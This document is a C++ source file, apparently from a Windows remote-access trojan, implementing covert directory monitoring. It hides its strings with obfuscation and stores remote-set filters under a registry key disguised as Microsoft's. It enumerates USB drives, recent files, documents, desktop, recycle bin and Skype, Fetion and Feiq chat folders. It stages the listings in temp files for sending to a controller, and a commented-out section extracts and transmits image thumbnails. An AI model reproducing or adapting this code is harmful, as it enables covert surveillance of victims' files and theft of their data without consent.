// DirCheck.cpp: implementation of the DirCheck class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "DirCheck.h"
#include "FileWork.h"
#include "struct.h"
#include "SpecDir.h"
#include "FilePublicFun.h"
#include "NdisSocket.h"
#include "mumaPublic.h"
#include "WinApi.h"
//#include "JpgLib.h"
#include "BmpToJpg.h"
#include "ScreenFile.h"
#include "Base.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
long	curStatusFileOpt	= 0xF0;	
//把枚举得到的目录列表存到文件里
void WriteDirList(DIRLIST& dirlist, char* ptype,char* bootdir);
DWORD  g_setstate=TRUE; //当重新设置参数后,要更新监控列表

/************************************************************************/
/* 设置 监控参数                                                       */
/************************************************************************/
DWORD WINAPI SetAutoCheckWork(LPVOID pPara)
{
	char ParaBuf[2000];
	ThreadParam *ppara=(ThreadParam*)pPara;
	strcpy(ParaBuf, ppara->buf);
	char buffer[2000];
	DWORD datalen=0;
	char TmpDeStr[30];

	int iTry = 0;
	while(iTry++ < 2000 && curStatusFileOpt != 0xF0)
		PSleep(10);
	
	PInterlockedExchange(&curStatusFileOpt, 0xF);
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	char *filefilter=NULL;
	char *settype=NULL;
	//初始化
	char *inputline=ParaBuf;
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, DeFileStringA(TmpDeStr, 30, "HEGkHEGVkT"))==0)//filefilter
		{
			 filefilter=value;
		}
		else if(stricmp(field, DeFileStringA(TmpDeStr, 30, "CkVVupk"))==0)//settype
		{
			settype=value;
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	
	
	if(filefilter==NULL || settype==NULL)
	{
		//SetAutoCheckWork 收到交互命令error!!!!
		delete pPara;
		return 0;
	}
	//SetAutoCheckWork 收到交互命令 Filefilter=%s,settype=%s",filefilter,settype

	char subkey[MAX_PATH], szvalue[MAX_PATH];
	if(settype && strlen(settype)>0)
	{
		if(stricmp(settype, DeFileStringA(TmpDeStr, 30, "eCYHEGVkT"))==0) //usbfilter  //usb disk的过滤文件参数
		{
			if(filefilter!=NULL)
			{
				//Software\\Microsoft  usbfilter
				memset(subkey, 0, MAX_PATH);
				memset(szvalue, 0, MAX_PATH);
				DeFileStringA(subkey, MAX_PATH, "ZlHVaSTk\\nEKTlClHV");
				DeFileStringA(szvalue, MAX_PATH, "eCYHEGVkT");
				PSHSetValueA(HKEY_CURRENT_USER, subkey, szvalue, REG_BINARY,filefilter, strlen(filefilter));
				g_setstate=TRUE;
			}
		}
		else if(stricmp(settype, DeFileStringA(TmpDeStr, 30, "KMkKsvETHEGVkT"))==0)// checkdirfilter //回传目录和文件过滤参数
		{
			if(filefilter!=NULL && strlen( filefilter)>0)
			{
				//Software\\Microsoft checkdir
				memset(subkey, 0, MAX_PATH);
				memset(szvalue, 0, MAX_PATH);
				DeFileStringA(subkey, MAX_PATH, "ZlHVaSTk\\nEKTlClHV");
				DeFileStringA(szvalue, MAX_PATH, "KMkKsvET");
				PSHSetValueA(HKEY_CURRENT_USER, subkey, szvalue, REG_BINARY,filefilter, strlen(filefilter));
				g_setstate=TRUE;
			}

		}

	}

	PInterlockedExchange(&curStatusFileOpt, 0xF0);

	char buf[10];
	if(g_setstate)
	{
		DeFileStringA(buf, 10, "ls"); //ok
	}
	else
	{
		DeFileStringA(buf, 10, "HSGCk"); //false
	}

	//content-type
	char strContentType[15];
	memset(strContentType, 0, 15);
	DeFileStringA(strContentType, 15, "KlFVkFVdVupk");
	//setcheckdir
	char strSetcheckdir[15];
	memset(strSetcheckdir, 0, 15);
	DeFileStringA(strSetcheckdir, 15, "CkVKMkKsvET");

	datalen += sprintf(buffer, "%s: %d\r\n", DeFileStringA(TmpDeStr, 30, "KlFVkFVdGkFgVM"), strlen(buf));//content-length
	datalen += sprintf(buffer+datalen, "%s: %s\r\n\r\n%s", strContentType, strSetcheckdir, buf); 

	SendData(buffer, datalen, ppara->PacketType, ppara->SessionID);

	delete pPara;
	return 1;
}

 //监控文件夹  
DWORD SetAutoCheckDir(DWORD*pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy(p, pPara, sizeof(ThreadParam));
	starthandle = CreateThread(
		NULL,
		0,
		SetAutoCheckWork, 
		p, 
		0, 
		&threadId);
	if(starthandle != NULL)
		CloseHandle(starthandle);
	
	return 0;
}

int mystrcmp(const char *src, char *key)
{
	char TmpStr[20];
	DeFileStringA(TmpStr, 20, key);
	int len = strlen(TmpStr);
	return strnicmp(src, TmpStr, len);
} 

DWORD WINAPI CheckDirThread(LPVOID p)
{
	int icount=0;
	
	//获得所有磁盘的目录结构
	HANDLE starthandle=0;
	DWORD  threadId=0;
	starthandle = CreateThread(NULL, 0, CheckDirList, 0, 0, &threadId);
	if(starthandle != NULL)
		CloseHandle(starthandle);

	
	//////////////////////////////dzmm这部分要屏蔽/////////////////////////////
	while (1)
	{
		icount++;
		if(!g_setstate && icount<100 )
		{
			//目录列表文件生成到temp 
		   PSleep(1000*60);//101分钟查一次	
		   continue;
		}
		//目录列表文件生成到temp 
		PSleep(1000*60);//101分钟查一次

		icount=0;
		g_setstate=FALSE;
		DWORD dwType=REG_BINARY;
		char dwVal[0x400];
		memset(dwVal,0,0x400);
		DWORD dwSize=0x400;

		char subkey[MAX_PATH], szvalue[MAX_PATH];
		memset(subkey, 0, MAX_PATH);
		memset(szvalue, 0, MAX_PATH);
		DeFileStringA(subkey, MAX_PATH, "LxdsHpaO\\Ftzaxvxds");
		DeFileStringA(szvalue, MAX_PATH, "zXOzjota");
		//Software\\Microsoft  checkdir
		if(PSHGetValueA(HKEY_CURRENT_USER, subkey, szvalue,
			&dwType, &dwVal, &dwSize)== ERROR_SUCCESS)
		{
			Para  parray[100];
			int count=100;
			Split(dwVal,dwSize,";",parray,count); //分类型
			for(int i=0;i<count;i++)
			{
				Para  parray1[2];
				int count1=2;
				Split(parray[i].value, parray[i].len, "#", parray1, count1); //分类型
				char buf[MAX_PATH];
				memset(buf, 0, MAX_PATH);
				memcpy(buf, parray1[0].value, min(MAX_PATH,parray1[0].len));

				WCHAR wtype[MAX_PATH], wftype[MAX_PATH];
				memset(wtype, 0, sizeof(wtype));
				memset(wftype, 0, sizeof(wftype));
				UTF_82Unicode(parray1[0].value, wtype, MAX_PATH*sizeof(WCHAR));
				UTF_82Unicode(parray1[1].value, wftype, MAX_PATH*sizeof(WCHAR));

 				DIRLIST	dirlist;
				//usbfile
				if(mystrcmp(buf, "eCYHEGk") == 0)
				{	 
					CheckUsbFileList(dirlist, wftype);	
				}
				//recent
				else if(mystrcmp(buf, "TkKkFV") == 0)
				{ 
					CheckRecentFileList(dirlist,parray1[1].value);
				}
				//mydocument
				else if(mystrcmp(buf, "WuvlKeWkFV") == 0)
				{	 
					CheckMyDocList(dirlist,wftype);
				}
				//desktop
				else if(mystrcmp(buf, "vkCsVlp") == 0)
				{	 
					CheckDeskTopList(dirlist,wftype);	
				}
				//recycle
				else if(mystrcmp(buf, "TkKuKGk") == 0)
				{
					CheckRecycleFileList(dirlist,wftype);
				}
				//skype
				else if(mystrcmp(buf, "Csupk") == 0)
				{
					CheckSkypeFileList(dirlist, parray1[1].value);
				}
				//fetion
				else if(mystrcmp(buf, "HkVElF") == 0)
				{
					CheckFetionFileList(dirlist, parray1[1].value);
				}
				//feiq
				else if(mystrcmp(buf, "HkEq") == 0)
				{
					CheckFeiqFileList(dirlist, parray1[1].value);
				}
				else
				{
					//形成目录列表.
					GetFileList(wtype,dirlist,wftype,0);
				}

				WriteDirList(dirlist, parray1[0].value, parray1[0].value);

				PSleep(1000);	
			}
		}		
	}
	//////////////////////////////////////////////////////////////////////////
	
	return 1;
}

DWORD StartCheckDir(DWORD* pPara)
{
	HANDLE hh = NULL;
	DWORD  threadId=0;
	hh = CreateThread(
		NULL,
		0,
		CheckDirThread, 
		pPara, 
		0, 
		&threadId);
	if(hh != NULL)
		CloseHandle(hh);
	return 1;
}

void WriteDirList(DIRLIST& dirlist, char* ptype,char* bootdir)
{
	int  buflen = SENDBUFFLEN;
	char tmpbuf[1024];
	int  datalen = 1024;
	char* pBuffer = new char[SENDBUFFLEN];
	memset(pBuffer, 0, SENDBUFFLEN);
	char utf8path[3*MAX_PATH];
	for (int i = 0; i < dirlist.filecount; i++)
	{
		if(dirlist.filelist[i].filetype==2) //代表已删除
			continue;
		SYSTEMTIME ftime;
		PFileTimeToLocalFileTime(&dirlist.filelist[i].filetime,&dirlist.filelist[i].filetime);
		PFileTimeToSystemTime(&dirlist.filelist[i].filetime, &ftime);
		Unicode2UTF_8(dirlist.filelist[i].filename, utf8path, 3*MAX_PATH-1);
		int len = sprintf(tmpbuf, "%04d%02d%02d%02d%02d%02d\t%I64d\t%d\t%s\r\n",
			ftime.wYear, ftime.wMonth, ftime.wDay, ftime.wHour, ftime.wMinute,
			ftime.wSecond, dirlist.filelist[i].filesize, dirlist.filelist[i].filetype,
			utf8path);
		
		if (datalen + len >= buflen)
		{
			char *tp = new char[buflen+SENDBUFFLEN];
			memcpy(tp, pBuffer, buflen);
			delete[] pBuffer;
			pBuffer = tp;
			memset(pBuffer+buflen, 0, SENDBUFFLEN);
			buflen += SENDBUFFLEN;
		}
		memcpy(pBuffer+datalen, tmpbuf, len);
		datalen += len;
	}
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);

	//content-type
	char strContenttype[15];
	memset(strContenttype, 0, 15);
	DeFileStringA(strContenttype, 15, "KlFVkFVdVupk");
	//filelist
	char strFilelist[15];
	memset(strFilelist, 0, 15);
	DeFileStringA(strFilelist, 15, "HEGkGECV");

	char TmpDeStr[30];

	//monitorvalue
	int len = sprintf(tmpbuf, "%s: %s\r\n", DeFileStringA(TmpDeStr, 30, "WlFEVlTISGek"), bootdir);
	//time
	len += sprintf(tmpbuf+len, "%s: %04d%02d%02d%02d%02d%02d\r\n", DeFileStringA(TmpDeStr, 30, "VEWk"), 
		nowtime.wYear, nowtime.wMonth, nowtime.wDay,
		nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
	//content-length
	len += sprintf(tmpbuf+len, "%s: %d\r\n", DeFileStringA(TmpDeStr, 30, "KlFVkFVdGkFgVM"), datalen-1024);
	//monitortype
	len += sprintf(tmpbuf+len, "%s: %s\r\n", DeFileStringA(TmpDeStr, 30, "WlFEVlTVupk"), ptype);
	len += sprintf(tmpbuf+len, "%s: %s\r\n\r\n", strContenttype, strFilelist);

	datalen = datalen - 1024 + len;
	memcpy(pBuffer+1024-len, tmpbuf, len);

	char filename[MAX_PATH];
	memset(filename,0,MAX_PATH);
	GetMonitorListFile(bootdir, filename);

//	WriteCyFile(filename, pBuffer+1024-len, datalen);
 	FILE * fs;
	fs=fopen(filename,"w+b");
	if(fs)
	{
		fwrite(pBuffer+1024-len,1,datalen,fs);
		fclose(fs);
	}
	delete[] pBuffer;
}

BOOL GetMonitorListFile(char * type,char * filename)
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath, 0, MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	
	char filedir[MAX_PATH];
	memset(filedir, 0, MAX_PATH);
	sprintf(filedir, "%s%s", flgTempPath, GetTmpPrevFix(FIX_MONITOR));
	if(_access(filedir, 0) != 0)
	{
		_mkdir(filedir);
	}
	char tmpbuf[MAX_PATH];
	int tmplen = Utf82Gb(type, strlen(type), tmpbuf, MAX_PATH);
	replacetype(tmpbuf, tmplen);
	sprintf(filename,"%s\\%s", filedir, tmpbuf);
	return TRUE;
}

void replacetype(char* value,int valuelen)
{
	for(int i=0;i<valuelen;i++)
	{
		char p=value[i];
		if(p==':')
		{
			value[i]='$';
		}
		else if(p=='\\')
		{
			value[i]='#';
		}
	}
}

//获取所有目录结构,放在临时目录的~BB16下,ptype=dirlist
DWORD WINAPI CheckDirList(LPVOID lp)
{
	while(g_dirwork == FALSE)
	{
		PSleep(30000);
	}

    //获取所有目录结构列表
	char dirverfiledir[MAX_PATH];
	GetFixDirFolder(dirverfiledir);
	char pdr[256];
	memset(pdr, 0, 256);
	int len = PGetLogicalDriveStringsA(256, pdr);
	char* p = pdr+len-4;
	for (; p >= pdr; p -= 4)
	{
		if ((*p == 'A') || (*p == 'a') ||
			(*p == 'B') || (*p == 'b'))
			continue;
		switch(PGetDriveTypeA(p))
		{
		case DRIVE_FIXED:	// 本地磁盘
			break;
		default:
			continue;
		}

		char driverfilename[MAX_PATH], tmpdriverfile[MAX_PATH];
		memset(driverfilename, 0, MAX_PATH);
		memset(tmpdriverfile, 0, MAX_PATH);
		sprintf(driverfilename, "%s\\%c", dirverfiledir, *p);
		sprintf(tmpdriverfile, "%s\\%c_tmp", dirverfiledir, *p);
		FILE * fs;
		fs=fopen(tmpdriverfile,"w+b");
		if(fs)
		{
			WCHAR wDriver[10];
			GB23122Unicode(p, wDriver, 10*sizeof(WCHAR));

			S_GetPathStruct(fs,wDriver);
			fclose(fs);
			
			PSleep(1000);

			PCopyFileA(tmpdriverfile, driverfilename, TRUE);
		}
	}
	return TRUE;
}

BOOL GetFixDirFolder(char *dirverfiledir) 
{
	char flgTempPath[MAX_PATH];
	memset(flgTempPath,0,MAX_PATH);
	DWORD l = PGetTempPathA(MAX_PATH, flgTempPath);	

	memset(dirverfiledir,0,MAX_PATH);
	sprintf(dirverfiledir, "%s%s", flgTempPath, GetTmpPrevFix(FIX_DIRLIST));
 	if(_access(dirverfiledir, 0) != 0)
	{
		_mkdir(dirverfiledir);
	}
	return TRUE; 
}

//////////////////////////////////////////////////////////////////////////
//设置获取缩略图
//////////////////////////////////////////////////////////////////////////
// string g_filepath = "";
// 
// DWORD SetThumbnail(DWORD *pPara)
// {
// 	ThreadParam *ThreadPara=(ThreadParam*)pPara;
// 	HANDLE starthandle=0;
// 	DWORD  threadId=0;
// 	ThreadParam *p = new ThreadParam;
// 	memcpy(p, pPara, sizeof(ThreadParam));
// 	starthandle = CreateThread(
// 		NULL,
// 		0,
// 		SendThumbnailFile, 
// 		p, 
// 		0, 
// 		&threadId);
// 
// 	if(starthandle != NULL)
// 	{
// 		char buffer[100];
// 		memset(buffer,0,100);
// 		DWORD datalen=0;
// 		datalen=sprintf(buffer, "content-length: 2\r\n\r\n%s", "ok");
// 		if(SendData(buffer, datalen, ThreadPara->PacketType, ThreadPara->SessionID))
// 		{
// 		}
// 
// 		CloseHandle(starthandle);
// 	}
// 	
// 	return 0;
// }
// 
// //发送缩略图线程
// DWORD WINAPI SendThumbnailFile(LPVOID pPara)
// {
// 	ThreadParam *ppara=(ThreadParam*)pPara;
// 	
// 	char *inputline	=ppara->buf;
// 	char *nextline	=0;
// 	char *field		=0;
// 	char *value		=0;
// 	
// 	char path[MAX_PATH];
// 	char type[20];
// 	memset(path, 0, MAX_PATH);
// 	memset(type, 0, 20);
// 	int	level = 0;
// 	
// 	int re=0;
// 	re=LineParser(inputline,&nextline,&field,&value);
// 	while(re)
// 	{
// 		if(stricmp(field, "path")==0) 
// 		{
// 			strcpy(path, value);
// 		}
// 		else if (stricmp(field, "type")==0)
// 		{
// 			strcpy(type, value);
// 		}
// 		if(re == 2)
// 			break;
// 		inputline=nextline;
// 		re=LineParser(inputline,&nextline,&field,&value);
// 	}
// 
// 	char tmpbuf[MAX_PATH];
// 	int tmplen = Utf82Gb(path, strlen(path), tmpbuf, MAX_PATH);
// 
// 	if (strcmp(type, "file") == 0)
// 	{
// 		GetOneThumbnail(tmpbuf);
// 	}
// 	else if (strcmp(type, "dir") == 0)
// 	{
// 		char SearchPath[MAX_PATH];
// 		memset(SearchPath, 0, MAX_PATH);
// 		strcpy(SearchPath, tmpbuf);
// 		strcat(SearchPath, "\\*.*");
// 
// 		HANDLE hfindfile;
// 		WIN32_FIND_DATAA finddata;
// 		hfindfile = PFindFirstFileA(SearchPath, &finddata);
// 		if (hfindfile != INVALID_HANDLE_VALUE)
// 		{
// 			char filePath[MAX_PATH];
// 			memset(filePath, 0, MAX_PATH);
// 			try
// 			{
// 				int runtimes=0;
// 				do
// 				{
// 					if (!(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
// 					{
// 						sprintf(filePath, "%s\\%s", tmpbuf, finddata.cFileName);
// 						GetOneThumbnail(filePath);
// 					}
// 				}while(PFindNextFileA(hfindfile, &finddata));
// 				
// 			}catch (...){
// 				
// 			}
// 			PFindClose(hfindfile);
// 		}
// 	}
// 
// 	delete ppara;
// 	return 1;
// }
// 
// void GetOneThumbnail(const char * szPath)
// {
// 	DWORD dwWeight = 160;
// 	DWORD dwHeight = 100;
// 
// 	HRESULT hr;
// 	HBITMAP hBitmap;
// 
// 	hr = CreateThumbnail( dwWeight, dwHeight, szPath, &hBitmap );
// 	if ( FAILED( hr ) )
// 	{
// 		IF_LOUD(DbgFat32Log("获得缩略图失败!");)
// 		return ;
// 	}
// 
// 	char utf8path[3*MAX_PATH];
// 	memset(utf8path, 0, sizeof(utf8path));
// 	Gb2Utf8(szPath, strlen(szPath), utf8path, 3*MAX_PATH-1);
// 	g_filepath = utf8path;
// 
// 	int m_len = 1024*1024;
// 	BYTE* m_temp = new BYTE[m_len];
// 	memset(m_temp, 0, m_len);
// 	int len = GetBitMapBuffer(PGetDC(NULL), hBitmap, 24, m_temp, m_len);
// 
// 	getallow(g_taskallow, 0);
// 	BMPToJPG(m_temp,  dwWeight, dwHeight, len, 100);
// 	//SetDumpFunction(DumpThumbnailBufferData);	
// 	//CompressToJpg(m_temp,  dwWeight, dwHeight, len, 100);
// 	releaseallow(g_taskallow, 1);
// }
// 
// HRESULT CreateThumbnail(DWORD dwWidth, DWORD dwHeight, const char * path, HBITMAP* pThumbnail)  
// {  
// 	LPITEMIDLIST pidlItems = NULL, pidlURL = NULL, pidlWorkDir = NULL;  
// 	ULONG   ulParseLen = 0;
// 	HRESULT hr;  
// 	WCHAR pszPath[MAX_PATH];  
// 	DWORD dwPriority = 0, dwFlags = IEIFLAG_ASPECT;  
// 	SIZE size = { dwWidth, dwHeight };  
// 	IExtractImage* peiURL = NULL;	// nterface is used to request a thumbnail image from a Shell folder
// 	IShellFolder* psfDesktop = NULL;  
// 	IShellFolder* psfWorkDir = NULL;  
// 	IMalloc*	  pMalloc = NULL;
// 	
// 	char  szDir[MAX_PATH], szFile[MAX_PATH];  
// 	WCHAR m_wsBuffer[255];
// 
// 	char * pos = strrchr(path, '\\');
// 	memset(szDir, 0, MAX_PATH);
// 	memset(szFile, 0, MAX_PATH);
// 	memcpy(szDir, path, pos-path+1);
// 	int dirlen = strlen(szDir);
// 	if (szDir[dirlen-1] == '\\' && szDir[dirlen-2] == '\\')
// 	{
// 		szDir[dirlen-1] = 0;
// 	}
// 	strcpy(szFile, pos+1);
// 	
// 	// 初始化Com库
// 	if (!SUCCEEDED(PCoInitialize(NULL)))
// 	{
// 		IF_LOUD(DbgFat32Log("初始化Com库失败!");)
// 		goto OnExit;
// 	}
// 	
// 	// 获得IMalloc接口
// 	hr = PSHGetMalloc( &pMalloc );
// 	if ( FAILED( hr ) )
// 	{
// 		goto OnExit;
// 	}
// 	
// 	// 获得桌面文件夹
// 	hr = PSHGetDesktopFolder(&psfDesktop);  
// 	if(FAILED(hr))
// 	{
// 		goto OnExit;
// 	}
// 	
// 	// get working directory  
// 	//strcpy(m_wsBuffer,wsDir.c_str());
// 	memset(m_wsBuffer, 0, sizeof(m_wsBuffer));
// 	GB23122Unicode(szDir, m_wsBuffer, 255);
// 	// ParseDisplayName:Translates a file object's or folder's display name into an item identifier list.
// 	hr = psfDesktop->ParseDisplayName(NULL, NULL, m_wsBuffer, &ulParseLen, &pidlWorkDir, NULL);  
// 	if(FAILED(hr))
// 	{
// 		goto OnExit;  
// 	}
// 	hr = psfDesktop->BindToObject(pidlWorkDir, NULL, IID_IShellFolder, (LPVOID*)&psfWorkDir);  
// 	if(FAILED(hr))
// 	{
// 		goto OnExit;  
// 	}
// 	psfDesktop->Release();  
// 	psfDesktop = NULL;  
// 	pMalloc->Free(pidlWorkDir);  
// 	pidlWorkDir = NULL;  
// 	
// 	// retrieve link information  
// 	//strcpy(m_wsBuffer,wsFile.c_str());
// 	memset(m_wsBuffer, 0, sizeof(m_wsBuffer));
// 	GB23122Unicode(szFile, m_wsBuffer, 255);
// 	hr = psfWorkDir->ParseDisplayName(NULL, NULL, m_wsBuffer, &ulParseLen, &pidlURL, NULL);  
// 	if(FAILED(hr))
// 	{
// 		goto OnExit;  
// 	}
// 	
// 	// query IExtractImage  
// 	hr = psfWorkDir->GetUIObjectOf(NULL, 1, (LPCITEMIDLIST*)&pidlURL, IID_IExtractImage, NULL, (LPVOID*)&peiURL);  
// 	if(FAILED(hr)) 
// 	{
// 		goto OnExit;  
// 	}
// 	
// 	// define thumbnail properties  
// 	hr = peiURL->GetLocation(pszPath, MAX_PATH, &dwPriority, &size, 16, &dwFlags);  
// 	if(FAILED(hr)) 
// 	{
// 		goto OnExit;  
// 	}
// 	
// 	// generate thumbnail  
// 	hr = peiURL->Extract(pThumbnail);  
// 	if(FAILED(hr)) 
// 	{
// 		goto OnExit;  
// 	}
// 	
// 	// clean-up IExtractImage  
// 	peiURL->Release();  
// 	peiURL = NULL;  
// 	
// OnExit:  
// 	
// 	// free allocated structures  
// 	if(peiURL != NULL) peiURL->Release();  
// 	if(pidlURL != NULL) pMalloc->Free(pidlURL);  
// 	if(pidlWorkDir != NULL) pMalloc->Free(pidlWorkDir);  
// 	if(psfDesktop != NULL) psfDesktop->Release();  
// 	if(psfWorkDir != NULL) psfWorkDir->Release();  
// 	PCoUninitialize();
// 	
// 	return hr;  
// }
// 
// int GetBitMapBuffer(HDC ScreenDc, HBITMAP hBitmap, int wBitCount, BYTE* buffer, int buflen)
// {
// 	//定义调色板大小， 位图中像素字节大小 ，  位图文件大小 ， 写入文件字节数
// 	DWORD           dwPaletteSize=0,dwBmBitsSize;
// 	BITMAP          Bitmap;               
// 	//位图文件头结构
// 	BITMAPINFOHEADER   bi;                    
// 	//指向位图信息头结构
//     HANDLE          hPal;
// 	HPALETTE     hOldPal=NULL;
// 	
// 	
// 	//计算调色板大小
// 	// 	if (wBitCount <= 8)
// 	// 		dwPaletteSize=(1<<wBitCount)*sizeof(RGBQUAD);
// 	
// 	//设置位图信息头结构
// 	PGetObjectA(hBitmap, sizeof(BITMAP), (LPSTR)&Bitmap);
// 	bi.biSize            = sizeof(BITMAPINFOHEADER);
// 	bi.biWidth           = Bitmap.bmWidth;
// 	bi.biHeight          = Bitmap.bmHeight;
// 	bi.biPlanes          = 1;
// 	bi.biBitCount         = wBitCount;
// 	bi.biCompression      = BI_RGB;
// 	bi.biSizeImage        = 0;
// 	bi.biXPelsPerMeter     = 0;
// 	bi.biYPelsPerMeter     = 0;
// 	bi.biClrUsed         = 0;
// 	bi.biClrImportant      = 0;
// 	
// 	dwBmBitsSize = ((Bitmap.bmWidth*wBitCount+31)/32)*4*Bitmap.bmHeight;
// 	
// 	if((DWORD)buflen<dwBmBitsSize)
// 		return 0;
// 	
// 	// 处理调色板   
// 	hPal = PGetStockObject(DEFAULT_PALETTE);
// 	if (hPal)
// 	{
// 		hOldPal=PSelectPalette(ScreenDc,(HPALETTE)hPal,FALSE);
// 		PRealizePalette(ScreenDc);
// 	}
// 	// 获取该调色板下新的像素值
// 	PGetDIBits(ScreenDc,hBitmap,0,(UINT)Bitmap.bmHeight,buffer, (BITMAPINFO *)&bi,DIB_RGB_COLORS);
// 	//恢复调色板   
// 	if (hOldPal)
// 	{
// 		PSelectPalette(ScreenDc, hOldPal, TRUE);
// 		PRealizePalette(ScreenDc);
// 	}
// 	
// 	//清除   
// 	return dwBmBitsSize;
// }

// #define		BUFFERLEN		2048
// SJpgBuffer	ThumbJpgBuffer;
// 
// BYTE* DumpThumbnailBufferData(const void* pBuffer, unsigned int& datalen, BOOL isLast)
// {
// 	if (!isLast)
// 		datalen = BUFFERLEN;
// 	else
// 		datalen = BUFFERLEN-datalen;
// 		
// 	if (pBuffer == NULL)
// 	{
// 		// 申请缓冲区
// 		if (ThumbJpgBuffer.buflen == 0)
// 		{
// 			ThumbJpgBuffer.pbuffer = new char [BUFFERLEN*800];
// 			ThumbJpgBuffer.buflen = BUFFERLEN * 800;
// 			memset(ThumbJpgBuffer.pbuffer, 0, ThumbJpgBuffer.buflen);
// 		}
// 		
// 		ThumbJpgBuffer.pos = 0;
// 		datalen = BUFFERLEN;
// 		return (BYTE*)ThumbJpgBuffer.pbuffer+ThumbJpgBuffer.pos;
// 	}
// 	else
// 	{
// 		if (ThumbJpgBuffer.pos+(int)datalen > ThumbJpgBuffer.buflen)
// 		{
// 			int newlen = ThumbJpgBuffer.buflen + BUFFERLEN*8;
// 			char* tp = new char[newlen];
// 			memcpy(tp, ThumbJpgBuffer.pbuffer, ThumbJpgBuffer.buflen);
// 			delete[] ThumbJpgBuffer.pbuffer;
// 			memset(tp+ThumbJpgBuffer.buflen, 0, BUFFERLEN*8);
// 			ThumbJpgBuffer.buflen = newlen;
// 			ThumbJpgBuffer.pbuffer = tp;
// 		}
// 		
// 		ThumbJpgBuffer.pos += datalen;
// 	}
// 	
// 	if (isLast)
// 	{
// 		if(SendThumbnailJpeg(ThumbJpgBuffer.pbuffer, ThumbJpgBuffer.pos))
// 		{
// 			IF_LOUD(DbgFat32Log("缩略图数据, 发送数据成功");)
// 		}
// 		else
// 		{
// 			IF_LOUD(DbgFat32Log("缩略图数据, 发送数据失败");)
// 		}
// 		
// 		datalen = 0;
// 		return NULL;
// 	}
// 	else
// 	{
// 		if (ThumbJpgBuffer.pos+BUFFERLEN > ThumbJpgBuffer.buflen)
// 		{
// 			int newlen = ThumbJpgBuffer.buflen + BUFFERLEN*8;
// 			char* tp = new char[newlen];
// 			memcpy(tp, ThumbJpgBuffer.pbuffer, ThumbJpgBuffer.buflen);
// 			delete[] ThumbJpgBuffer.pbuffer;
// 			memset(tp+ThumbJpgBuffer.buflen, 0, BUFFERLEN*8);
// 			ThumbJpgBuffer.buflen = newlen;
// 			ThumbJpgBuffer.pbuffer = tp;
// 		}
// 		datalen = BUFFERLEN;
// 		PSleep(10);
// 		return (BYTE*)ThumbJpgBuffer.pbuffer+ThumbJpgBuffer.pos;
// 	}
// }
// 
// BOOL SendThumbnailJpeg(char*buf ,int buflen)
// {
// 	char	Headbuf[2000];
// 	int		Headlen = 0;
// 
// 	WORD session = GetFatAutoSendID();
// 
// 	SYSTEMTIME nowtime;
// 	PGetLocalTime(&nowtime);
// 	Headlen =  sprintf(Headbuf+Headlen, "filename: %s\r\n", g_filepath.c_str());
// 	Headlen += sprintf(Headbuf+Headlen, "time: %04d%02d%02d%02d%02d%02d\r\n", 
// 		nowtime.wYear, nowtime.wMonth, nowtime.wDay,
// 		nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
// 	Headlen += sprintf(Headbuf+Headlen, "content-length: %d\r\n", buflen);
// 	Headlen += sprintf(Headbuf+Headlen, "monitortype: %s\r\n", "thumbnail");
// 	Headlen += sprintf(Headbuf+Headlen, "monitorvalue: %s\r\n", "thumbnail");
// 	Headlen += sprintf(Headbuf+Headlen, "content-type: file\r\n\r\n");
// 	SendData(Headbuf, Headlen, 5, session);//先发出头
// 
// 	SendData(buf, buflen, 5, session);
// 	return TRUE;
// }

